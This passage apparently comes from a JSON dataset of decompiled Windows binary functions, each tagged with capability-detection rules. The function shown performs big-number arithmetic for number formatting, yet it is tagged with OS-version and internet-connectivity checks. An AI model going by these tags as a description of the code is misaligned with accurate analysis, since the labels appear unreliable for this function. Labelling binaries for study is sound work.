true;\n                puVar8 = arg_8h;\n            }\n            else {\n                if (var_3a4h < uVar5) {\n                    var_3b4h = &var_3a0h;\n                    uVar5 = 0;\n                    var_3c0h = var_3a8h;\n                    var_1d4h = 0;\n                    var_3b8h = 0;\n                    var_3c8h = var_3a4h;\n                    if (var_3a4h != 0) goto code_r0x0046b160;\n                }\n                else {\n                    var_3b4h = var_3a8h;\n                    var_3c0h = &var_3a0h;\n                    var_3b0h = var_3a4h;\n                    var_1d4h = 0;\n                    var_3c8h = uVar5;\ncode_r0x0046b160:\n                    var_1d4h = 0;\n                    var_3b8h = 0;\n                    uVar5 = 0;\n                    do {\n                        if (var_3b4h[var_3b8h] == 0) {\n                            if (var_3b8h == uVar5) {\n                                uVar5 = var_3b8h + 1;\n                                (&var_1d0h)[var_3b8h] = 0;\n                                var_1d4h = uVar5;\n                            }\n                        }\n                        else {\n                            uVar7 = 0;\n                            var_3c4h = 0;\n                            uVar9 = var_3b8h;\n                            if (var_3b0h != 0) {\n                                do {\n                                    if (uVar9 == 0x73) break;\n                                    if (uVar9 == uVar5) {\n                                        (&var_1d0h)[uVar9] = 0;\n                                        var_1d4h = var_3b8h + 1 + var_3c4h;\n                                    }\n                                    uVar5 = var_3c0h[var_3c4h];\n                                    uVar10 = var_3b4h[var_3b8h];\n                                    uVar4 = uVar5 * uVar10;\n                                    uVar3 = (&var_1d0h)[uVar9];\n                                    uVar2 = uVar4 + (&var_1d0h)[uVar9];\n                                    (&var_1d0h)[uVar9] = uVar2 + uVar7;\n                                    uVar7 = (uVar5 * uVar10 >> 0x20) + CARRY4(uVar4, uVar3) + CARRY4(uVar2, uVar7);\n                                    var_3c4h = var_3c4h + 1;\n                                    uVar9 = uVar9 + 1;\n                                    uVar5 = var_1d4h;\n                                } while (var_3c4h != var_3b0h);\n                                if (uVar7 != 0) {\n                                    uVar10 = uVar9;\n                                    puVar11 = &var_1d0h + uVar9;\n                                    do {\n                                        uVar9 = uVar10;\n                                        if (uVar10 == 0x73) break;\n                                        uVar9 = uVar10 + 1;\n                                        if (uVar10 == uVar5) {\n                                            *puVar11 = 0;\n                                            var_1d4h = uVar9;\n                                        }\n                                        uVar5 = *puVar11;\n                                        *puVar11 = *puVar11 + uVar7;\n                                        uVar7 = CARRY4(uVar5, uVar7);\n                                        uVar5 = var_1d4h;\n                                        uVar10 = uVar9;\n                                        puVar11 = puVar11 + 1;\n                                    } while (uVar7 != 0);\n                                }\n                            }\n                            if (uVar9 == 0x73) {\n                                var_5a8h = 0;\n                                *var_3ach = 0;\n                                fcn.0046cb87(var_3a8h, 0x1cc, &var_5a4h, 0);\n                                bVar1 = false;\n                                goto code_r0x0046b2ec;\n                            }\n                        }\n                        var_3b8h = var_3b8h + 1;\n                        arg_8h = var_3ach;\n                    } while (var_3b8h != var_3c8h);\n                }\n                puVar8 = arg_8h;\n                *puVar8 = uVar5;\n                fcn.0046cb87(var_3a8h, 0x1cc, &var_1d0h, uVar5 << 2);\n                bVar1 = true;\n            }\n        }\ncode_r0x0046b2ec:\n        if (!bVar1) {\n            *puVar8 = 0;\n            fcn.0046cb87(arg_8h_00, 0x1cc, &var_5a4h, 0);\n            fcn.004303e9(0);\n            return;\n        }\n        puVar11 = puVar8 + 1;\n        var_3cch = var_3cch - var_3bch;\n        arg_8h = puVar8;\n    } while( true );\n}\n",
        "token_count": 3237
    },
    "0046b59f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_974h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0046b59f(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h, uint32_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uchar *puVar8;\n    uint32_t *puVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint32_t *puVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint32_t *puVar16;\n    uchar *puVar17;\n    uint *puVar18;\n    uint32_t *puVar19;\n    uint32_t *puVar20;\n    bool bVar21;\n    char *arg_10h_00;\n    uint var_974h;\n    uint var_970h;\n    uint32_t var_7a4h;\n    uint var_7a0h;\n    uint var_798h;\n    uint var_794h;\n    uint var_790h;\n    uint *var_78ch;\n    uint32_t var_788h;\n    uint32_t var_784h;\n    uint32_t *var_780h;\n    uint var_77ch;\n    uint32_t var_778h;\n    uint32_t *var_770h;\n    uint32_t *var_76ch;\n    uint32_t *var_768h;\n    uint *var_764h;\n    uint32_t *var_760h;\n    uint32_t *var_759h;\n    uint32_t *var_754h;\n    uchar *var_750h;\n    uint32_t *var_74ch;\n    uint32_t *var_748h;\n    uint32_t *var_744h;\n    uint var_740h;\n    uint32_t *var_574h;\n    uint32_t var_570h;\n    uint var_56ch;\n    uint32_t *var_3a4h;\n    uint32_t *var_3a0h;\n    uint32_t *apuStack928 [114];\n    uint32_t *var_1d4h;\n    uint32_t *var_1d0h;\n    uint32_t var_1cch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_78ch = arg_18h;\n    var_760h = arg_1ch;\n    fcn.00470500(&var_7a0h);\n    var_798h._0_1_ = (var_7a0h & 0x1f) != 0x1f;\n    if (var_798h) {\n        fcn.00470569(&var_7a0h);\n    }\n    uVar6 = arg_ch;\n    uVar4 = 0x20;\n    if ((arg_ch < 1) && (arg_ch < 0)) {\n        uVar4 = 0x2d;\n    }\n    *var_78ch = uVar4;\n    var_78ch[2] = var_760h;\n    fcn.0045ac0d(&var_7a4h, 0, 0);\n    if (((uVar6 & 0x7ff00000) == 0) && (((arg_8h | uVar6 & 0xfffff) == 0 || ((var_7a4h & 0x1000000) != 0)))) {\n        arg_10h_00 = 0x481624;\n        var_78ch[1] = 0;\ncode_r0x0046b6b7:\n        iVar5 = fcn.0045acc6(var_760h, arg_20h, arg_10h_00);\n    }\n    else {\n        iVar5 = fcn.0045dfd0(&arg_8h);\n        if (iVar5 == 0) {\ncode_r0x0046b6fa:\n            arg_ch = uVar6 & 0x7fffffff;\n            var_790h = 0x8001f;\n            fcn.0045ac0d(&var_794h, 0, 0);\n            fcn.0045ac0d(&var_778h, 0x8001f, var_790h);\n            _var_77ch = CONCAT44(arg_ch, arg_8h);\n            var_788h = arg_10h + 1;\n            uVar6 = arg_ch >> 0x14 & 0x7ff;\n            bVar21 = uVar6 != 0;\n            if (bVar21) {\n                uVar6 = 0;\n                iVar5 = 0x100000;\n            }\n            else {\n                iVar5 = 0;\n            }\n            var_750h = !bVar21;\n            var_770h = arg_8h + uVar6;\n            var_1cch = (arg_ch & 0xfffff) + iVar5 + CARRY4(arg_8h, uVar6);\n            var_74ch = var_750h + (arg_ch >> 0x14 & 0x7ff);\n            fcn.004705c0();\n            fcn.004706d0();\n            var_784h = fcn.00476f60();\n            if ((var_784h == 0x7fffffff) || (var_784h == 0x80000000)) {\n                var_784h = 0;\n            }\n            var_1d0h = var_770h;\n            var_750h = (var_1cch != 0) + 1;\n            var_1d4h = var_750h;\n            if (var_74ch < 0x433) {\n                if (var_74ch == 0x35) {\ncode_r0x0046bcd0:\n                    _var_77ch = _var_77ch & 0xffffffff;\n                    uVar6 = (&var_1d0h)[var_1cch != 0];\n                    iVar5 = 0x1f;\n                    if (uVar6 != 0) {\n                        for (; uVar6 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar6 == 0) {\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = iVar5 + 1;\n                    }\n                    puVar12 = var_750h + (iVar5 == 0x20);\n                    if (puVar12 < 0x74) {\n                        if (puVar12 + -1 != 0xffffffff) {\n                            puVar8 = puVar12 + -2;\n                            puVar17 = var_750h;\n                            puVar13 = puVar12 + -1;\n                            do {\n                                if (puVar13 < puVar17) {\n                                    iVar5 = (&var_1d0h)[puVar13];\n                                }\n                                else {\n                                    iVar5 = 0;\n                                }\n                                if (puVar8 < puVar17) {\n                                    uVar6 = (&var_1d4h)[puVar13];\n                                }\n                                else {\n                                    uVar6 = 0;\n                                }\n                                puVar14 = puVar13 + -1;\n                                puVar8 = puVar8 + -1;\n                                (&var_1d0h)[puVar13] = uVar6 >> 0x1f | iVar5 * 2;\n                                puVar17 = var_1d4h;\n                                puVar13 = puVar14;\n                            } while (puVar14 != 0xffffffff);\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                        puVar12 = var_1d4h;\n                    }\n                    var_1d4h = puVar12;\n                    uVar6 = 0x434 - var_74ch;\n                    uVar15 = uVar6 >> 5;\n                    fcn.00431db0(&var_570h);\n                    (&var_570h)[uVar15] = 1 << (uVar6 & 0x1f);\n                }\n                else {\n                    var_570h = 0;\n                    var_56ch = 0x100000;\n                    var_574h = 0x2;\n                    if (var_1cch == 0) goto code_r0x0046bcd0;\n                    iVar5 = 0;\n                    do {\n                        if (*(&var_570h + iVar5) != *(&var_1d0h + iVar5)) goto code_r0x0046bcd0;\n                        iVar5 = iVar5 + 4;\n                    } while (iVar5 != 8);\n                    iVar5 = 0x1f;\n                    if (var_1cch != 0) {\n                        for (; var_1cch >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    _var_77ch = _var_77ch & 0xffffffff;\n                    if (var_1cch == 0) {\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = iVar5 + 1;\n                    }\n                    puVar12 = var_750h + (0x20U - iVar5 < 2);\n                    if (puVar12 < 0x74) {\n                        if (puVar12 + -1 != 0xffffffff) {\n                            puVar8 = puVar12 + -2;\n                            puVar17 = var_750h;\n                            puVar13 = puVar12 + -1;\n                            do {\n                                if (puVar13 < puVar17) {\n                                    iVar5 = (&var_1d0h)[puVar13];\n                                }\n                                else {\n                                    iVar5 = 0;\n                                }\n                                if (puVar8 < puVar17) {\n                                    uVar6 = (&var_1d4h)[puVar13];\n                                }\n                                else {\n                                    uVar6 = 0;\n                                }\n                                puVar14 = puVar13 + -1;\n                                puVar8 = puVar8 + -1;\n                                (&var_1d0h)[puVar13] = uVar6 >> 0x1e | iVar5 << 2;\n                                puVar17 = var_1d4h;\n                                puVar13 = puVar14;\n                            } while (puVar14 != 0xffffffff);\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                        puVar12 = var_1d4h;\n                    }\n                    var_1d4h = puVar12;\n                    uVar6 = 0x435 - var_74ch;\n                    uVar15 = uVar6 >> 5;\n                    fcn.00431db0(&var_570h);\n                    (&var_570h)[uVar15] = 1 << (uVar6 & 0x1f);\n                }\n                var_574h = uVar15 + 1;\n                var_3a4h = var_574h;\n                fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, var_574h * 4);\n            }\n            else {\n                var_570h = 0;\n                var_56ch = 0x100000;\n                var_574h = 0x2;\n                if (var_1cch == 0) {\ncode_r0x0046ba19:\n                    *0x4 = var_74ch + -0x432 & 0x1f;\n                    var_764h = var_74ch + -0x432 >> 5;\n                    var_754h = 0x20 - *0x4;\n                    iVar5 = fcn.00476ee0();\n                    puVar8 = var_750h;\n                    var_76ch = iVar5 + -1;\n                    _var_77ch = _var_77ch & 0xffffffff;\n                    var_770h = ~var_76ch;\n                    uVar6 = (&var_1d4h)[var_750h];\n                    iVar5 = 0x1f;\n                    if (uVar6 != 0) {\n                        for (; uVar6 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar6 == 0) {\n                        var_750h = NULL;\n                    }\n                    else {\n                        var_750h = iVar5 + 1;\n                    }\n                    if ((puVar8 + var_764h < 0x74) &&\n                       (var_748h = puVar8 + (0x20 - var_750h < stack0xfffff8a4) + var_764h,  var_748h < 0x74)) {\n                        var_780h = var_764h - 1;\n                        var_74ch = var_748h + -1;\n                        if (var_74ch != var_780h) {\n                            puVar17 = var_74ch - var_764h;\n                            var_768h = &var_1d4h + puVar17;\n                            do {\n                                if (puVar17 < puVar8) {\n                                    var_750h = var_768h[1];\n                                }\n                                else {\n                                    var_750h = NULL;\n                                }\n                                if (puVar17 + -1 < puVar8) {\n                                    uVar6 = *var_768h;\n                                }\n                                else {\n                                    uVar6 = 0;\n                                }\n                                (&var_1d0h)[var_74ch] =\n                                     (uVar6 & var_770h) >> (var_754h & 0x1f) |\n                                     (var_750h & var_76ch) << (stack0xfffff8a4 & 0x1f);\n                                var_74ch = var_74ch + -1;\n                                var_768h = var_768h + -1;\n                                puVar17 = puVar17 + -1;\n                                puVar8 = var_1d4h;\n                            } while (var_74ch != var_780h);\n                        }\n                        var_1d4h = var_748h;\n                        if (var_764h != NULL) {\n                            puVar18 = &var_1d0h;\n                            for (puVar11 = var_764h; puVar11 != NULL; puVar11 = puVar11 - 1) {\n                                *puVar18 = 0;\n                                puVar18 = puVar18 + 1;\n                            }\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                    }\n                    var_570h = 2;\n                }\n                else {\n                    iVar5 = 0;\n                    do {\n                        if (*(&var_570h + iVar5) != *(&var_1d0h + iVar5)) goto code_r0x0046ba19;\n                        iVar5 = iVar5 + 4;\n                    } while (iVar5 != 8);\n                    *0x4 = var_74ch + -0x431 & 0x1f;\n                    var_764h = var_74ch + -0x431 >> 5;\n                    var_754h = 0x20 - *0x4;\n                    iVar5 = fcn.00476ee0();\n                    puVar8 = var_750h;\n                    var_76ch = iVar5 + -1;\n                    _var_77ch = _var_77ch & 0xffffffff;\n                    var_770h = ~var_76ch;\n                    uVar6 = (&var_1d4h)[var_750h];\n                    iVar5 = 0x1f;\n                    if (uVar6 != 0) {\n                        for (; uVar6 >> iVar5 == 0; iVar5 = iVar5 + -1) {\n                        }\n                    }\n                    if (uVar6 == 0) {\n                        var_750h = NULL;\n                    }\n                    else {\n                        var_750h = iVar5 + 1;\n                    }\n                    if ((puVar8 + var_764h < 0x74) &&\n                       (var_748h = puVar8 + (0x20 - var_750h < stack0xfffff8a4) + var_764h,  var_748h < 0x74)) {\n                        var_780h = var_764h - 1;\n                        var_74ch = var_748h + -1;\n                        if (var_74ch != var_780h) {\n                            puVar17 = var_74ch - var_764h;\n                            var_768h = &var_1d4h + puVar17;\n                            do {\n                                if (puVar17 < puVar8) {\n                                    var_750h = var_768h[1];\n                                }\n                                else {\n                                    var_750h = NULL;\n                                }\n                                if (puVar17 + -1 < puVar8) {\n                                    uVar6 = *var_768h;\n                                }\n                                else {\n                                    uVar6 = 0;\n                                }\n                                (&var_1d0h)[var_74ch] =\n                                     (uVar6 & var_770h) >> (var_754h & 0x1f) |\n                                     (var_750h & var_76ch) << (stack0xfffff8a4 & 0x1f);\n                                var_74ch = var_74ch + -1;\n                                var_768h = var_768h + -1;\n                                puVar17 = puVar17 + -1;\n                                puVar8 = var_1d4h;\n                            } while (var_74ch != var_780h);\n                        }\n                        var_1d4h = var_748h;\n                        if (var_764h != NULL) {\n                            puVar18 = &var_1d0h;\n                            for (puVar11 = var_764h; puVar11 != NULL; puVar11 = puVar11 - 1) {\n                                *puVar18 = 0;\n                                puVar18 = puVar18 + 1;\n                            }\n                        }\n                    }\n                    else {\n                        var_574h = NULL;\n                        var_1d4h = NULL;\n                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, 0);\n                    }\n                    var_570h = 4;\n                }\n                var_56ch = 0;\n                var_3a4h = 0x1;\n                var_574h = 0x1;\n                fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, 4);\n            }\n            var_750h = 0xa;\n            if (var_784h < 0) {\n                _var_77ch = _var_77ch & 0xffffffff | -var_784h << 0x20;\n                for (var_770h = -var_784h / 10; var_770h != NULL; var_770h = var_770h - stack0xfffff8a4) {\n                    unique0x100014fb = var_770h;\n                    if (0x26 < var_770h) {\n                        stack0xfffff678 = 0x26;\n                    }\n                    uVar6 = *(*NULL * 4 + 0x481566);\n                    uVar15 = *(*NULL * 4 + 0x481567);\n                    var_574h = uVar6 + uVar15;\n                    fcn.00431db0(&var_570h);\n                    fcn.004312b0(&var_570h + uVar6, *(stack0xfffff8a4 * 4 + 0x481564) * 4 + 0x480c60, uVar15 << 2);\n                    puVar12 = var_1d0h;\n                    var_76ch = var_574h;\n                    if (var_574h < 0x2) {\n                        if (var_570h == 0) {\n                            var_974h = 0;\n                            var_1d4h = NULL;\n                            fcn.0046cb87(&var_1d0h, 0x1cc, &var_970h, 0);\n                        }\n                        else if ((var_570h != 1) && (var_1d4h != NULL)) {\n                            uVar6 = 0;\n                            var_754h = var_1d4h;\n                            puVar12 = NULL;\n                            do {\n                                uVar15 = (&var_1d0h)[puVar12];\n                                uVar10 = var_570h * uVar15;\n                                (&var_1d0h)[puVar12] = uVar10 + uVar6;\n                                uVar6 = (var_570h * uVar15 >> 0x20) + CARRY4(uVar10, uVar6);\n                                puVar12 = puVar12 + 1;\n                            } while (puVar12 != var_1d4h);\n                            if (uVar6 == 0) goto code_r0x0046c3dc;\n                            if (var_1d4h < 0x73) {\n                                (&var_1d0h)[var_1d4h] = uVar6;\n                                var_1d4h = var_1d4h + 1;\n                                goto code_r0x0046c3dc;\n                            }\n                            var_974h = 0;\n                            var_1d4h = NULL;\n                            fcn.0046cb87(&var_1d0h, 0x1cc, &var_970h, 0);\n                            bVar21 = false;\n                            goto code_r0x0046c6ff;\n                        }\ncode_r0x0046c3dc:\n                        bVar21 = true;\n                    }\n                    else {\n                        if (var_1d4h < 0x2) {\n                            var_754h = var_1d0h;\n                            var_1d4h = var_574h;\n                            fcn.0046cb87(&var_1d0h, 0x1cc, &var_570h, var_574h << 2);\n                            if (puVar12 == NULL) {\n                                var_974h = 0;\n                                var_1d4h = NULL;\n                                iVar5 = 0;\n                                puVar11 = &var_970h;\n                                goto code_r0x0046c6ec;\n                            }\n                            if ((puVar12 != 0x1) && (var_1d4h != NULL)) {\n                                uVar6 = 0;\n                                var_76ch = var_1d4h;\n                                puVar12 = NULL;\n                                do {\n                                    uVar15 = (&var_1d0h)[puVar12];\n                                    uVar10 = ZEXT48(var_754h) * uVar15;\n                                    (&var_1d0h)[puVar12] = uVar10 + uVar6;\n                                    uVar6 = (ZEXT48(var_754h) * uVar15 >> 0x20) + CARRY4(uVar10, uVar6);\n                                    puVar12 = puVar12 + 1;\n                                } while (puVar12 != var_1d4h);\n                                if (uVar6 != 0) {\n                                    if (0x72 < var_1d4h) {\ncode_r0x0046c7b7:\n                                        var_974h = 0;\n                                        var_1d4h = NULL;\n                                        fcn.0046cb87(&var_1d0h, 0x1cc, &var_970h, 0);\n                                        bVar21 = false;\n                                        goto code_r0x0046c6ff;\n                                    }\n                                    (&var_1d0h)[var_1d4h] = uVar6;\n                                    var_1d4h = var_1d4h + 1;\n                                }\n                            }\n                        }\n                        else {\n                            var_764h = &var_570h;\n                            if (var_574h < var_1d4h) {\n                                var_754h = &var_1d0h;\n                                var_780h = var_574h;\n                            }\n                            else {\n                                var_764h = &var_1d0h;\n                                var_754h = &var_570h;\n                                var_780h = var_1d4h;\n                                var_1d4h = var_574h;\n                            }\n                            puVar19 = NULL;\n                            puVar12 = NULL;\n                            var_744h = NULL;\n                            var_76ch = var_1d4h;\n                            if (var_780h != NULL) {\n                                do {\n                                    if (var_764h[puVar19] == 0) {\n                                        if (puVar19 == puVar12) {\n                                            (&var_740h)[puVar19] = 0;\n                                            puVar12 = puVar19 + 1;\n                                            var_744h = puVar12;\n                                        }\n                                    }\n                                    else {\n                                        var_748h = NULL;\n                                        var_74ch = NULL;\n                                        puVar20 = puVar19;\n                                        if (var_1d4h != NULL) {\n                                            do {\n                                                if (puVar20 == 0x73) break;\n                                                if (puVar20 == puVar12) {\n                                                    (&var_740h)[puVar20] = 0;\n                                                    var_744h = var_74ch + 1 + puVar19;\n                                                }\n                                                uVar6 = var_754h[var_74ch];\n                                                uVar15 = var_764h[puVar19];\n                                                uVar7 = uVar6 * uVar15;\n                                                puVar8 = uVar7 + var_748h;\n                                                puVar12 = &var_740h + puVar20;\n                                                uVar10 = *puVar12;\n                                                *puVar12 = puVar8 + *puVar12;\n                                                var_748h = (uVar6 * uVar15 >> 0x20) + CARRY4(uVar7, var_748h) +\n                                                           CARRY4(uVar10, puVar8);\n                                                var_74ch = var_74ch + 1;\n                                                puVar20 = puVar20 + 1;\n                                                puVar12 = var_744h;\n                                            } while (var_74ch != var_1d4h);\n                                            if (var_748h != NULL) {\n                                                puVar16 = puVar20;\n                                                var_768h = &var_740h + puVar20;\n                                                do {\n                                                    if (puVar16 == 0x73) goto code_r0x0046c7b7;\n                                                    puVar20 = puVar16 + 1;\n                                                    if (puVar16 == puVar12) {\n                                                        *var_768h = 0;\n                                                        var_744h = puVar20;\n                                                    }\n                                                    puVar9 = var_768h + 1;\n                                                    uVar6 = *var_768h;\n                                                    *var_768h = *var_768h + var_748h;\n                                                    var_748h = CARRY4(uVar6, var_748h);\n                                                    puVar12 = var_744h;\n                                                    puVar16 = puVar20;\n                                                    var_768h = puVar9;\n                                                } while (var_748h != NULL);\n                                            }\n                                        }\n                                        if (puVar20 == 0x73) goto code_r0x0046c7b7;\n                                    }\n                                    puVar19 = puVar19 + 1;\n                                } while (puVar19 != var_780h);\n                            }\n                            iVar5 = puVar12 << 2;\n                            puVar11 = &var_740h;\n                            var_1d4h = puVar12;\ncode_r0x0046c6ec:\n                            fcn.0046cb87(&var_1d0h, 0x1cc, puVar11, iVar5);\n                        }\n                        bVar21 = true;\n                    }\ncode_r0x0046c6ff:\n                    if (!bVar21) goto code_r0x0046c805;\n                }\n                var_778h = _var_77ch >> 0x20;\n                if (var_778h % 10 != 0) {\n                    uVar6 = *((var_778h % 10) * 4 + 0x4815fc);\n                    _var_77ch = _var_77ch & 0xffffffff | uVar6 << 0x20;\n                    if (uVar6 == 0) {\ncode_r0x0046c805:\n                        var_1d4h = NULL;\n                        puVar11 = &var_1d0h;\n                        goto code_r0x0046c812;\n                    }\n                    if ((uVar6 != 1) && (var_1d4h != NULL)) {\n                        var_770h = NULL;\n                        puVar12 = NULL;\n                        do {\n                            uVar15 = (&var_1d0h)[puVar12];\n                            uVar10 = uVar6 * uVar15;\n                            (&var_1d0h)[puVar12] = uVar10 + var_770h;\n                            var_770h = (uVar6 * uVar15 >> 0x20) + CARRY4(uVar10, var_770h);\n                            puVar12 = puVar12 + 1;\n                        } while (puVar12 != var_1d4h);\n                        if (var_770h != NULL) {\n                            if (0x72 < var_1d4h) goto code_r0x0046c805;\n                            (&var_1d0h)[var_1d4h] = var_770h;\n                            var_1d4h = var_1d4h + 1;\n                        }\n                    }\n                }\n            }\n            else {\n                for (var_754h = var_784h / 10; var_754h != NULL; var_754h = var_754h - var_768h) {\n                    var_768h = var_754h;\n                    if (0x26 < var_754h) {\n                        var_768h = 0x26;\n                    }\n                    uVar6 = *(var_768h * 4 + 0x481566);\n                    uVar15 = *(var_768h * 4 + 0x481567);\n                    var_574h = uVar6 + uVar15;\n                    fcn.00431db0(&var_570h);\n                    fcn.004312b0(&var_570h + uVar6, *(var_768h * 4 + 0x481564) * 4 + 0x480c60, uVar15 << 2);\n                    puVar12 = var_3a0h;\n                    var_780h = var_574h;\n                    if (var_574h < 0x2) {\n                        if (var_570h == 0) {\n                            var_744h = NULL;\n                            var_3a4h = NULL;\n                            fcn.0046cb87(&var_3a0h, 0x1cc, &var_740h, 0);\n                        }\n                        else if ((var_570h != 1) && (var_3a4h != NULL)) {\n                            puVar12 = NULL;\n                            var_770h = var_3a4h;\n                            puVar19 = NULL;\n                            do {\n                                puVar20 = apuStack928[puVar19 + -1];\n                                uVar6 = var_570h * ZEXT48(puVar20);\n                                apuStack928[puVar19 + -1] = uVar6 + puVar12;\n                                puVar12 = (var_570h * ZEXT48(puVar20) >> 0x20) + CARRY4(uVar6, puVar12);\n                                puVar19 = puVar19 + 1;\n                            } while (puVar19 != var_3a4h);\n                            if (puVar12 == NULL) goto code_r0x0046bec0;\n                            if (var_3a4h < 0x73) {\n                                apuStack928[var_3a4h + -1] = puVar12;\n                                var_3a4h = var_3a4h + 1;\n                                goto code_r0x0046bec0;\n                            }\n                            var_574h = NULL;\n                            var_3a4h = NULL;\n                            fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, 0);\n                            bVar21 = false;\n                            goto code_r0x0046c1f9;\n                        }\ncode_r0x0046bec0:\n                        bVar21 = true;\n                    }\n                    else {\n                        if (var_3a4h < 0x2) {\n                            var_770h = var_3a0h;\n                            var_3a4h = var_574h;\n                            fcn.0046cb87(&var_3a0h, 0x1cc, &var_570h, var_574h << 2);\n                            if (puVar12 == NULL) {\n                                var_574h = NULL;\n                                var_3a4h = NULL;\n                                iVar5 = 0;\n                                puVar11 = &var_570h;\n                                goto code_r0x0046c1e6;\n                            }\n                            if ((puVar12 != 0x1) && (var_3a4h != NULL)) {\n                                puVar12 = NULL;\n                                var_76ch = var_3a4h;\n                                puVar19 = NULL;\n                                do {\n                                    puVar20 = apuStack928[puVar19 + -1];\n                                    uVar6 = ZEXT48(var_770h) * ZEXT48(puVar20);\n                                    apuStack928[puVar19 + -1] = uVar6 + puVar12;\n                                    puVar12 = (ZEXT48(var_770h) * ZEXT48(puVar20) >> 0x20) + CARRY4(uVar6, puVar12);\n                                    puVar19 = puVar19 + 1;\n                                } while (puVar19 != var_3a4h);\n                                if (puVar12 != NULL) {\n                                    if (0x72 < var_3a4h) {\n                                        var_574h = NULL;\n                                        puVar11 = &var_570h;\ncode_r0x0046c26a:\n                                        var_3a4h = NULL;\n                                        fcn.0046cb87(&var_3a0h, 0x1cc, puVar11, 0);\n                                        bVar21 = false;\n                                        goto code_r0x0046c1f9;\n                                    }\n                                    apuStack928[var_3a4h + -1] = puVar12;\n                                    var_3a4h = var_3a4h + 1;\n                                }\n                            }\n                        }\n                        else {\n                            var_764h = &var_570h;\n                            if (var_574h < var_3a4h) {\n                                unique0x00001e00 = &var_3a0h;\n                                var_76ch = var_574h;\n                            }\n                            else {\n                                var_764h = &var_3a0h;\n                                unique0x00001e00 = &var_570h;\n                                var_76ch = var_3a4h;\n                                var_3a4h = var_574h;\n                            }\n                            puVar19 = NULL;\n                            puVar12 = NULL;\n                            var_744h = NULL;\n                            var_780h = var_3a4h;\n                            if (var_76ch != NULL) {\n                                do {\n                                    if (var_764h[puVar19] == 0) {\n                                        if (puVar19 == puVar12) {\n                                            (&var_740h)[puVar19] = 0;\n                                            puVar12 = puVar19 + 1;\n                                            var_744h = puVar12;\n                                        }\n                                    }\n                                    else {\n                                        var_748h = NULL;\n                                        var_74ch = NULL;\n                                        puVar20 = puVar19;\n                                        if (var_3a4h != NULL) {\n                                            do {\n                                                if (puVar20 == 0x73) break;\n                                                if (puVar20 == puVar12) {\n                                                    (&var_740h)[puVar20] = 0;\n                                                    var_744h = var_74ch + 1 + puVar19;\n                                                }\n                                                uVar6 = (*NULL)[var_74ch];\n                                                uVar15 = var_764h[puVar19];\n                                                uVar7 = uVar6 * uVar15;\n                                                puVar8 = uVar7 + var_748h;\n                                                puVar12 = &var_740h + puVar20;\n                                                uVar10 = *puVar12;\n                                                *puVar12 = puVar8 + *puVar12;\n                                                var_748h = (uVar6 * uVar15 >> 0x20) + CARRY4(uVar7, var_748h) +\n                                                           CARRY4(uVar10, puVar8);\n                                                var_74ch = var_74ch + 1;\n                                                puVar20 = puVar20 + 1;\n                                                puVar12 = var_744h;\n                                            } while (var_74ch != var_3a4h);\n                                            if (var_748h != NULL) {\n                                                puVar16 = puVar20;\n                                                var_74ch = &var_740h + puVar20;\n                                                do {\n                                                    if (puVar16 == 0x73) goto code_r0x0046c250;\n                                                    puVar20 = puVar16 + 1;\n                                                    if (puVar16 == puVar12) {\n                                                        *var_74ch = 0;\n                                                        var_744h = puVar20;\n                                                    }\n                                                    puVar9 = var_74ch + 1;\n                                                    uVar6 = *var_74ch;\n                                                    *var_74ch = *var_74ch + var_748h;\n                                                    var_748h = CARRY4(uVar6, var_748h);\n                                                    puVar12 = var_744h;\n                                                    puVar16 = puVar20;\n                                                    var_74ch = puVar9;\n                                                } while (var_748h != NULL);\n                                            }\n                                        }\n                                        if (puVar20 == 0x73) {\ncode_r0x0046c250:\n                                            var_974h = 0;\n                                            puVar11 = &var_970h;\n                                            goto code_r0x0046c26a;\n                                        }\n                                    }\n                                    puVar19 = puVar19 + 1;\n                                } while (puVar19 != var_76ch);\n                            }\n                            iVar5 = puVar12 << 2;\n                            puVar11 = &var_740h;\n                            var_3a4h = puVar12;\ncode_r0x0046c1e6:\n                            fcn.0046cb87(&var_3a0h, 0x1cc, puVar11, iVar5);\n                        }\n                        bVar21 = true;\n                    }\ncode_r0x0046c1f9:\n                    if (!bVar21) goto code_r0x0046c292;\n                }\n                if (var_784h % 10 != 0) {\n                    var_770h = *((var_784h % 10) * 4 + 0x4815fc);\n                    if (var_770h == NULL) {\ncode_r0x0046c292:\n                        var_3a4h = NULL;\n                        puVar11 = &var_3a0h;\ncode_r0x0046c812:\n                        var_974h = 0;\n                        fcn.0046cb87(puVar11, 0x1cc, &var_970h, 0);\n                    }\n                    else if ((var_770h != 0x1) && (var_3a4h != NULL)) {\n                        var_754h = 